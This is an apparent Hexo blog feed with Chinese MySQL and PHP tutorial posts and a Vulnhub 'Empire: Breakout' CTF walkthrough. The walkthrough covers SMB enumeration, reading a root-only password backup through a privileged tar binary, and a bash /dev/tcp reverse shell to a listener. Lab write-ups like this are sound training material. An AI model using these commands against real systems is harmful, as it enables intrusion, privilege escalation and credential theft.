&#x27;备注&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>修改表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 旧表名 RENAME 新表名;</span><br></pre></td></tr></table></figure></li><li><p>删除数据：使用<code>DELETE FROM</code>语句从表中删除数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name WHERE condition;</span><br></pre></td></tr></table></figure></li><li><p>查询数据：使用<code>SELECT</code>语句从表中查询数据。</p><ul><li><p>查询所有列的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name;</span><br></pre></td></tr></table></figure></li><li><p>查询指定列的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name;</span><br></pre></td></tr></table></figure></li><li><p>查询满足条件的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name WHERE condition;</span><br></pre></td></tr></table></figure></li><li><p>查询并排序结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name ORDER BY column ASC/DESC;</span><br></pre></td></tr></table></figure></li><li><p>使用聚合函数查询数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(column) FROM table_name;</span><br><span class="line">SELECT SUM(column) FROM table_name;</span><br><span class="line">SELECT AVG(column) FROM table_name;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="1-2数据库类型"><a href="#1-2数据库类型" class="headerlink" title="1.2数据库类型"></a>1.2数据库类型</h3><table><thead><tr><th align="left">int</th><th>整型</th></tr></thead><tbody><tr><td align="left">float</td><td>单精度浮点 4字节32位</td></tr><tr><td align="left">double</td><td>双精度浮点 8字节64位</td></tr><tr><td align="left">char</td><td>固定长度的字符类型</td></tr><tr><td align="left">varchar</td><td>可变长度的字符类型</td></tr><tr><td align="left">text</td><td>文本</td></tr><tr><td align="left">image</td><td>图片</td></tr><tr><td align="left">decimal (5,2)</td><td>5个有效长度数字，小数点后面有2位</td></tr></tbody></table><h4 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h4><p>SQL语句用于维护管理数据库，包括数据查询、数据更新、访问控制、对象管理等功能。</p><p>分类：</p><table><thead><tr><th>DDL</th><th>数据定义语言，用于创建数据库对象，如库、表、索引等</th></tr></thead><tbody><tr><td>DML</td><td>数据操纵语言，用于对表中的数据进行管理</td></tr><tr><td>DQL</td><td>数据查询语言，用于从数据表中查找符合条件的数据记录</td></tr><tr><td>DCL</td><td>数据控制语言，用于设置或者更改数据库用户或角色权限</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> MYSQL数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库笔记 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用PHP连接Mysql</title>
      <link href="/2023/09/16/%E4%BD%BF%E7%94%A8PHP%E8%BF%9E%E6%8E%A5Mysql/"/>
      <url>/2023/09/16/%E4%BD%BF%E7%94%A8PHP%E8%BF%9E%E6%8E%A5Mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="使用PHP连接Mysql"><a href="#使用PHP连接Mysql" class="headerlink" title="使用PHP连接Mysql"></a>使用PHP连接Mysql</h1><p> Mysql 兼容很多语言，不仅仅是php，例如：PERL, C, C++, JAVA 和 PHP等，其中PHP使用的范围最为广泛。</p><h1 id="简述PHP语法"><a href="#简述PHP语法" class="headerlink" title="简述PHP语法"></a>简述PHP语法</h1><ol><li><p>连接数据库： 使用<code>mysqli_connect()</code>函数或者<code>PDO</code>类中提供的方法，连接到MySQL数据库服务器。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br></pre></td></tr></table></figure></li><li><p>执行查询： 使用<code>mysqli_query()</code>函数或者<code>PDO</code>类中的相关方法执行SQL查询语句。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM table_name&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure></li><li><p>处理结果： 针对查询结果进行处理，可以使用<code>mysqli_fetch_assoc()</code>、<code>mysqli_fetch_array()</code>等函数获取每一行的数据。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Codewhile</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;column_name&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>插入数据： 使用<code>INSERT INTO</code>语句向数据库中插入新记录。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO table_name (column1, column2, column3) VALUES (&#x27;value1&#x27;, &#x27;value2&#x27;, &#x27;value3&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure></li><li><p>更新数据： 使用<code>UPDATE</code>语句更新数据库中的记录。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE table_name SET column1 = &#x27;new_value&#x27; WHERE condition&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure></li><li><p>删除数据： 使用<code>DELETE FROM</code>语句删除数据库中的记录。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM table_name WHERE condition&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure></li><li><p>关闭连接： 当不再需要连接时，使用<code>mysqli_close()</code>函数关闭数据库连接。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Codemysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure></li></ol><h1 id="PHP连接MYsql"><a href="#PHP连接MYsql" class="headerlink" title="PHP连接MYsql"></a>PHP连接MYsql</h1><p>连接测试:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$retval</span> = <span class="title function_ invoke__">mysqli_function</span>(value, [value,...]);</span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$retval</span> )</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">die</span> ( <span class="string">&quot;error&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>连接到数据库：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>; <span class="comment">// 数据库主机名</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;password&#x27;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$database</span> = <span class="string">&#x27;mydb&#x27;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 创建PDO对象</span></span><br><span class="line">    <span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=<span class="subst">$host</span>;dbname=<span class="subst">$database</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置错误模式为异常</span></span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 连接成功，可以执行数据库操作</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    <span class="variable">$conn</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// 连接异常处理</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> MYSQL数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库笔记 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql数据库速通笔记1</title>
      <link href="/2023/09/14/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
      <url>/2023/09/14/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是数据库"><a href="#什么是数据库" class="headerlink" title="什么是数据库"></a>什么是数据库</h1><p>数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据，我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</p><p>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p><h2 id="1-1数据库的种类"><a href="#1-1数据库的种类" class="headerlink" title="1.1数据库的种类"></a>1.1数据库的种类</h2><p>MySQL、MariaDB（MySQL的代替品）、Percona Server（MySQL的代替品·）、PostgreSQL、Microsoft Access、Google Fusion Tables、SQLite、DB2、FileMaker、Oracle、SQL Server、INFORMIX、Sybase、dBASE、Clipper、FoxPro、foshub</p><h2 id="1-2非关系型数据库（NoSQL）"><a href="#1-2非关系型数据库（NoSQL）" class="headerlink" title="1.2非关系型数据库（NoSQL）"></a>1.2非关系型数据库（NoSQL）</h2><p>redis、MongoDB、<a href="https://blog.csdn.net/wyz0516071128/article/details/80877984">Memcache</a>、HBase、BigTable、Cassandra、CouchDB、Neo4J</p><h2 id="2-1RDBMS-术语"><a href="#2-1RDBMS-术语" class="headerlink" title="2.1RDBMS 术语"></a>2.1RDBMS 术语</h2><p>了解数据库之前先了解在sql中的术语，也就是叫法</p><ul><li><strong>数据库:</strong> 数据库是一些关联表的集合。</li><li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li><li><strong>列:</strong> 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。</li><li><strong>行：</strong>一行（元组，或记录）是一组相关的数据，例如一条用户订阅的数据。</li><li><strong>冗余</strong>：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li><li><strong>主键</strong>：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。</li><li><strong>外键：</strong>外键用于关联两个表。</li><li><strong>复合键</strong>：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。</li><li><strong>索引：</strong>使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li><li><strong>参照完整性:</strong> 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性</li></ul><p>后面都会有介绍，先可以了解一下！</p><ul><li><strong>表头(header)</strong>: 每一列的名称;</li><li><strong>列(col)</strong>: 具有相同数据类型的数据的集合;</li><li><strong>行(row):</strong> 每一行用来描述某条记录的具体信息;</li><li><strong>值(value):</strong> 行的具体信息, 每个值必须与该列的数据类型相同;</li><li><strong>键(key)</strong>: 键的值在当前列中具有唯一性。</li></ul><h1 id="MYSQL学习之路"><a href="#MYSQL学习之路" class="headerlink" title="MYSQL学习之路"></a>MYSQL学习之路</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MySQL 社区版是全球广受欢迎的开源数据库的免费下载版本。它遵循 GPL 许可协议，由庞大、活跃的开源开发人员社区提供支持。</p><p>简单来讲Mysql是开源的，支持众多的系统，支持众多的语言，如：<code>C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl </code>等。</p><h2 id="windows版本sql环境"><a href="#windows版本sql环境" class="headerlink" title="windows版本sql环境"></a>windows版本sql环境</h2><p>可以前往官网下载对应的版本：<a href="https://www.mysql.com/cn/downloads/">MySQL :: MySQL Downloads</a></p><p>菜鸟教程:<a href="https://www.runoob.com/w3cnote/windows10-mysql-installer.html">Windows10 MYSQL Installer 安装（mysql-installer-community-5.7.19.0.msi） | 菜鸟教程 (runoob.com)</a></p><p>我这里为了方便直接使用<code>phpstudy</code></p><p>PHPstudy官网:<a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a></p><p>下载完成后直接启动mysql服务就行了</p><p><img src="https://img1.imgtp.com/2023/09/14/BN1i7exu.png"></p><p><strong>将密码修改为</strong><code>123456</code></p><p><img src="https://img1.imgtp.com/2023/09/14/NbfsTFmY.png"></p><h3 id="使用终端登入"><a href="#使用终端登入" class="headerlink" title="使用终端登入"></a>使用终端登入</h3><p><img src="https://img1.imgtp.com/2023/09/14/6Hmx8mzB.png"></p><p>登入成功</p><p><img src="https://img1.imgtp.com/2023/09/14/KJTWeEu5.png"></p><p>本地登入可以直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/OARqHI87.png"></p><p>说明成功了！！</p><h2 id="基本命令使用"><a href="#基本命令使用" class="headerlink" title="基本命令使用"></a>基本命令使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES:</span><br><span class="line">列出 MySQL 数据库管理系统的数据库列表。</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/OARqHI87.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES:</span><br><span class="line">显示指定数据库的所有表，使用该命令前需要使用 use 命令来选择要操作的数据库。</span><br><span class="line">使用此命令需要选择数据库use 库名</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/5J55jyur.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW COLUMNS FROM 数据表:</span><br><span class="line">显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/SVV1XDyC.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW INDEX FROM 数据表:</span><br><span class="line">显示数据表的详细索引信息，包括PRIMARY KEY（主键）。</span><br><span class="line">下面展示的暂时没有索引信息</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/14/UuQaDUvq.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLE STATUS [FROM db_name] [LIKE &#x27;pattern&#x27;] G:</span><br><span class="line">该命令将输出Mysql数据库管理系统的性能及统计信息。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MYSQL数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库笔记 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机渗透之权限提取，SMB泄露问题-靶场Breakout</title>
      <link href="/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/"/>
      <url>/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/</url>
      
        <content type="html"><![CDATA[<h1 id="学习前言"><a href="#学习前言" class="headerlink" title="学习前言"></a>学习前言</h1><p>vulnhub是个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。</p><p>Vulnhub 官网：<a href="https://www.vulnhub.com/">Vulnerable By Design ~ VulnHub</a></p><p>今天用到的靶场Breakout：<a href="https://www.vulnhub.com/entry/empire-breakout,751/">Empire: Breakout ~ VulnHub</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>环境：Linux kali Breakout靶机 浏览器</p><p>知识点：Linux基础</p><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p>我们拿到靶机后打开直接看到IP地址了</p><p><img src="https://img1.imgtp.com/2023/09/13/21hDFBXO.png"></p><p>但是如果在真实的环境当中进行内网渗透，我们看不到目标主机怎么办呢</p><p>我们知道，内网一般存在于一个网段或者不同网段，可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -sn 192.168.159.0/24 #扫描整个网段里的所有IP地址</span><br></pre></td></tr></table></figure><p>这里我们直接知道IP为：192.168.159.134</p><h4 id="第一步：开始收集它开放的端口"><a href="#第一步：开始收集它开放的端口" class="headerlink" title="第一步：开始收集它开放的端口"></a>第一步：开始收集它开放的端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -sV 192.168.159.134</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/RCvVcQN8.png"></p><p>可以看到开放的端口是很多的有:<code>80 139 445 10000 20000 </code></p><p>首先我们先访问一下 <code>80 端口</code>有啥东西</p><p><img src="https://img1.imgtp.com/2023/09/13/w6tu9LXo.png"></p><p> 发现了个Apache的页面，说明了它用的中间件是 Apache2</p><p>发现这个有啥用呢，也没发现什么敏感的信息，正当我准备关闭的时候，按下了F12 发现了个不一样的东西</p><p><img src="https://img1.imgtp.com/2023/09/13/91RPOF1q.png"></p><p> 一窜窜东西还提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted</span><br></pre></td></tr></table></figure><p>翻译过来大概是：不要担心，他很安全</p><p>哪它到底安不安全呢?起初我以为是简单的摩尔斯密码，但我一看，有点不像，因为它多了几个符号杂七杂八的东西，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure><p>然后我试了各种密码都不对，最后我还是通过csdn的一篇文章，看到了原题，才知道这是ook加密</p><p><img src="https://img1.imgtp.com/2023/09/13/084SaDkI.png"></p><p>最后解密过来就是：<code> .2uqPEfj3D&lt;P&#39;a-3</code></p><p>推荐解密工具：<a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoK加密解密 - Bugku CTF</a></p><p>这一长串的东西，有点像密码，但我们又不确定，先存着</p><p>然后我们再看看 10000 和 20000 这个端口里面是啥</p><p><img src="https://img1.imgtp.com/2023/09/13/sLBSNXZq.png"></p><p><img src="https://img1.imgtp.com/2023/09/13/s8P3R540.png"></p><p>一个网站是Uermin 一个是 Webmin</p><p>两个网站挺正常的也没啥可以的点。</p><h3 id="二、SMB-泄露"><a href="#二、SMB-泄露" class="headerlink" title="二、SMB 泄露"></a>二、SMB 泄露</h3><p>我们通过端口扫描的时候发现了它开启了<code>SMB服务</code>，文件共享服务</p><p>那么我们是否可以通过一些工具来，扫描这些文件有没有我们想要的内容呢？</p><p><img src="https://img1.imgtp.com/2023/09/13/tX2S0dMu.png"></p><p>我们试试用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.159.134</span><br></pre></td></tr></table></figure><p> Enum4Linux 是很棒的扫描工具，可以扫描发现SMB泄露的文件</p><p>通过扫描我们发现了敏感的东西</p><p><img src="https://img1.imgtp.com/2023/09/13/042Obx2M.png"></p><p> 发现了啥 再\Unix User\ 文件有个用户文件叫做<code>cyber</code></p><p>说明什么，说明了这个可能就是系统的某个账户，那么再结合我们上面的密码，是否可以访问后台了呢，首先刚刚有10000 和 20000 两个网站 一个是web应用的后台 密码应该不能是系统里的用户</p><p>所以我们锁定了Usermin，我们试着登入试试</p><p><img src="https://img1.imgtp.com/2023/09/13/BF1uPfR0.png"></p><p>登入成功，既然是个文件管理系统，那不就好办了，可以知道网站上的所有文件</p><p>我们直接打开终端</p><p> <img src="https://img1.imgtp.com/2023/09/13/WAxzoouL.png"></p><p>通过查看目录，发现了一个<code>user.txt</code>打开它就得到了第一个flag</p><p> <img src="https://img1.imgtp.com/2023/09/13/nDKK4LfU.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cyber@breakout ~]$ ls</span><br><span class="line">tar</span><br><span class="line">user.txt</span><br><span class="line">[cyber@breakout ~]$ cat user.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br><span class="line">[cyber@breakout ~]$</span><br></pre></td></tr></table></figure><h3 id="三、Linux提权"><a href="#三、Linux提权" class="headerlink" title="三、Linux提权"></a>三、Linux提权</h3><p>在我们打开另一个<code> tar</code>文件的时候发现啥权限不够，查看权限的时候发现只有root用户才能操作，我们用户是 cyber 无权操作 但是这个是可执行文件，说明什么？</p><p>权限如何看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r 表示文件可以被读（read）</span><br><span class="line"></span><br><span class="line">w 表示文件可以被写（write）</span><br><span class="line"></span><br><span class="line">x 表示文件可以被执行（如果它是程序的话）</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/YU2H5CQw.png"></p><p> 那么我们如何提权呢？如何拿到<code>root</code>权限呢？<br>我们找到网站目录文件看看有啥好东西</p><p><img src="https://img1.imgtp.com/2023/09/13/dX7ijPV5.png"></p><p> 敏感文件 <code>backups</code> 备份文件，进去看看</p><p><img src="https://img1.imgtp.com/2023/09/13/NJrhCpp0.png"></p><p> 还是没发现什么有用的文件，那是不是隐藏了？</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/Okceg2CQ.png"></p><p>果然有个 <code>old_pass.bak</code></p><p> 我们只有读取的权限，那么我们通过打包再解压的方式</p><p>一定要cd ~ 不然会没有权限访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/tar -cvf oldpass.tar /</span>var<span class="regexp">/backups/</span>.old_pass.bak</span><br><span class="line">tar -xvf oldpass.tar</span><br></pre></td></tr></table></figure><p>最后</p><p><img src="https://img1.imgtp.com/2023/09/13/PiFdT4Gs.png"></p><p>得到密码了</p><p>后面发现直接 su 的话是不能直接登入的</p><p><img src="https://img1.imgtp.com/2023/09/13/LQjAbhm6.png"></p><p>所以就用到强大的kali  用 NC做个反弹shell</p><p>nc -lvvp 999</p><p> 靶机上输入：里面是kali的IP、 999 是监听的端口</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.159.128&#x2F;999 0&gt;&amp;1<br>最后就得到flag了</p><p><img src="https://img1.imgtp.com/2023/09/13/hqXm4wXY.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Vulnhub的这个靶场非常适合新手的朋友，里面包含了 信息收集，密码解密，SMB共享文件泄露</p><p>备份文件泄露，通过泄露的密码进行Linux提权。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 靶场练习 </tag>
            
            <tag> 提权 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是SSTI？</title>
      <link href="/2023/09/13/%E4%BB%80%E4%B9%88%E6%98%AFSSTI%EF%BC%9F/"/>
      <url>/2023/09/13/%E4%BB%80%E4%B9%88%E6%98%AFSSTI%EF%BC%9F/</url>
      
